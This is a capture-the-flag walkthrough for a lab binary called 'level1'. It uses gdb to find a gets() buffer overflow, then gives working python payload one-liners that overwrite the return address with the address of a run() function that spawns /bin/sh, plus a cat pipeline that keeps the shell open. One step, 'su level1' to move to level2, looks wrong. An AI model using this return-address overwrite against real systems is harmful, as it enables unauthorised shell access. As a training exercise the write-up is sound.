# Level1 Walkthrough

## Analyzing the Program with GDB

1. **Disassemble the `main` function**:  
   Using the command `disas`, we found that the program uses two functions :
   - run : uses `fwrite` to display a message in the stdout then execute the shell command `/bin/sh` using `system`
   - main : uses `gets` to receive user input which is vulnerable to buffer overflow exploit (if the input is over 80bytes, cf sub $0x50, $esp -> 0x50 is 80 in hexadecimal)

## Running the program

1. **Execute the Program with the Correct Input**:  
   We ran the program with the following command:  
   ```bash
   ./level1
   ```
    The program is waiting for the user to insert an input, then exits properly.

2. **Trying to overflow the RET value**
    we launched the program in gdb with an str containing 80 char as input. we created a small script to generate the string:
    ``` python -c 'print "a" * 80' > /tmp/exploit```
    
    As expected, the program segfaulted in gdb with the command `r < /tmp/exploit` with the following message :
    0x61616161 in ?? () 

    0x61616161 means that we have an overflow of 4 "a", as 61 is the ASCII code for a in hex.

    now we will update our exploit to insert 76 chars and the adress of the run function, to force its execution.
    Adress of run() is : 0x08048444 
    ```python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit```

    We now launch the following command :
    ```cat /tmp/exploit | ./level1```

    We now had a problem because /bin/sh exits after executing all the commands in
    /tmp/exploit as it encounters an EOF so we had a "-" to keep the stdin open so 
    /bin/sh will keep listening to stdin and execute what is send through it.
    ```cat /tmp/exploit - | ./level1```

## Moving to level2

1. **Swith User to level2**:
    Run ```su level1```

2. **Authenticate with the Password**:
    We used the password we found.